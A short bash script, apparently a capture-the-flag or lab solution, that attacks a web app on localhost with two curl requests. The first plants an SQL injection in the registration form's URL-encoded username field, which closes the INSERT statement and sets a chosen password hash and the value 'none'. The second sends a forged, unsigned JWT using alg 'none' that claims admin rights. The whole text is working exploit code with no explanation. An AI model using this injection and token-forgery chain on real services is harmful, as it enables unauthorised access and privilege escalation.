#!/bin/bash
curl 'http://localhost:39860/register' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=user%22%2C+%22%242b%2412%24sPvSVCeKoAmnrMH.Pnrx..f2tmG0akgJwm7Mg8dJ7qdepnNVcjLLW%22%2C+%22none%22%29--&password=test'
curl 'http://localhost:39860/profile' -H 'Cookie: access_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlciIsImFkbWluIjp0cnVlLCJpYXQiOjE3MzgyNTA5NDF9.'
